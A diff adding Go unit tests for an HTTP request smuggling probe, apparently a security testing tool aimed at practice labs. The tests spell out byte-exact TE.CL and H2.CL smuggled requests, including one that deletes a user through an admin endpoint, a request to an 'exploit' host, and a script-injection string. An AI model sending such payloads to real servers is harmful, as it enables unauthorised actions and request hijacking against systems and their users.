@@ -150,6 +150,29 @@ func TestSmugglingProbeSendsExactBytesOnOneConnection(t *testing.T) {
 	}
 }
 
+func TestSmugglingProbeExecuteMultiUsesFreshConnections(t *testing.T) {
+	addr, accepts := rawServer(t, func(conn net.Conn) error {
+		_ = conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
+		_, _ = conn.Read(make([]byte, 4096))
+		return writeHTTP(conn, http.StatusOK)
+	})
+	p := &SmugglingProbe{Variant: VariantCLTE, Timeout: 2 * time.Second, Idle: 200 * time.Millisecond}
+	src := &countingSource{addr: addr}
+	res, err := p.ExecuteMulti(context.Background(), Target{Addr: addr}, src)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := accepts.Load(); got != 3 {
+		t.Fatalf("accepted connections = %d, want 3 (baseline, payload, victim)", got)
+	}
+	if got := src.dials.Load(); got != 3 {
+		t.Fatalf("source dials = %d, want 3", got)
+	}
+	if got := len(res.Exchanges); got != 3 {
+		t.Fatalf("exchanges = %d, want 3", got)
+	}
+}
+
 func TestSmugglingProbeReportsExtraResponse(t *testing.T) {
 	// The fixture answers the baseline and the payload once each, then answers
 	// twice after the victim was written: that is what a front-end emits when it
@@ -457,6 +480,91 @@ func TestSmuggleChainProbeRetriesWithFreshPayloadConn(t *testing.T) {
 	}
 }
 
+func TestSmuggleChainTECLPayloadBytes(t *testing.T) {
+	p := &SmuggleChainProbe{
+		Variant:        VariantTECL,
+		SmuggledMethod: "GET",
+		SmuggledPath:   "/admin/delete?username=carlos",
+		SmuggledHost:   "localhost",
+	}
+	got, err := p.buildTECL(Target{Addr: "lab.test:443", Host: "lab.test"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := "POST / HTTP/1.1\r\nHost: lab.test\r\nUser-Agent: omnislash-probe/1\r\n" +
+		"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n" +
+		"87\r\nGET /admin/delete?username=carlos HTTP/1.1\r\nHost: localhost\r\n" +
+		"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\n" +
+		"x=1\r\n0\r\n\r\n"
+	if string(got) != want {
+		t.Fatalf("TE.CL payload =\n%q\nwant\n%q", got, want)
+	}
+}
+
+func TestSmuggleChainTECLAcceptsMarkerOnPayloadResponse(t *testing.T) {
+	addr, _ := rawServer(t, func(conn net.Conn) error {
+		return writeHTTPBody(conn, http.StatusOK, "Congratulations, you solved the lab!")
+	})
+	p := &SmuggleChainProbe{
+		Variant:         VariantTECL,
+		SmuggledPath:    "/admin/delete?username=carlos",
+		SmuggledHost:    "localhost",
+		SuccessContains: "Congratulations",
+		Attempts:        1,
+		Timeout:         2 * time.Second,
+		Idle:            200 * time.Millisecond,
+	}
+	res, err := p.ExecuteMulti(context.Background(), Target{Addr: addr, Host: "lab.test"}, &countingSource{addr: addr})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !hasFinding(res, "smuggle_confirmed") {
+		t.Fatalf("findings = %+v, want smuggle_confirmed from the payload response", res.Findings)
+	}
+}
+
+func TestH2CLBuildSmuggledRequest(t *testing.T) {
+	p := &H2CLProbe{
+		SmuggledMethod: "GET",
+		SmuggledPath:   "/exploit",
+		SmuggledHost:   "exploit.example.net",
+	}
+	got, err := p.buildSmuggled(Target{Addr: "lab.example.net:443", Host: "lab.example.net"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := "GET /exploit HTTP/1.1\r\nHost: exploit.example.net\r\n\r\n"
+	if string(got) != want {
+		t.Fatalf("smuggled request = %q, want %q", got, want)
+	}
+}
+
+func TestH2CLPrefixAlignsWithDeclaredLength(t *testing.T) {
+	p := &H2CLProbe{
+		SmuggledPrefix: "AAAAAAAAAAAAAAAAAAAA",
+		SmuggledMethod: "GET",
+		SmuggledPath:   "/exploit",
+		SmuggledHost:   "exploit.example.net",
+	}
+	got, err := p.buildSmuggled(Target{Addr: "lab.example.net:443", Host: "lab.example.net"})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(p.SmuggledPrefix) != 20 {
+		t.Fatalf("prefix length = %d, want 20", len(p.SmuggledPrefix))
+	}
+	if !strings.HasPrefix(string(got), p.SmuggledPrefix+"GET /exploit HTTP/1.1\r\n") {
+		t.Fatalf("prefixed request = %q", got)
+	}
+}
+
+func TestH2CLProbeExecuteRejectsSingleConn(t *testing.T) {
+	p := &H2CLProbe{}
+	if _, err := p.Execute(context.Background(), Target{Addr: "127.0.0.1:1"}, nil); !errors.Is(err, ErrMultiConn) {
+		t.Fatalf("Execute error = %v, want ErrMultiConn", err)
+	}
+}
+
 func TestSmuggleChainProbeExecuteRejectsSingleConn(t *testing.T) {
 	p := &SmuggleChainProbe{}
 	if _, err := p.Execute(context.Background(), Target{Addr: "127.0.0.1:1"}, nil); !errors.Is(err, ErrMultiConn) {
@@ -478,6 +586,7 @@ func (s *countingSource) Dial(ctx context.Context) (net.Conn, error) {
 func TestBuildTunnelPath(t *testing.T) {
 	got := buildTunnelPath(
 		"/",
+		"lab.test",
 		"lab.test",
 		"/resources?<script>alert(1)</script>",
 		[]string{"/a.svg", "/b.jpg"},
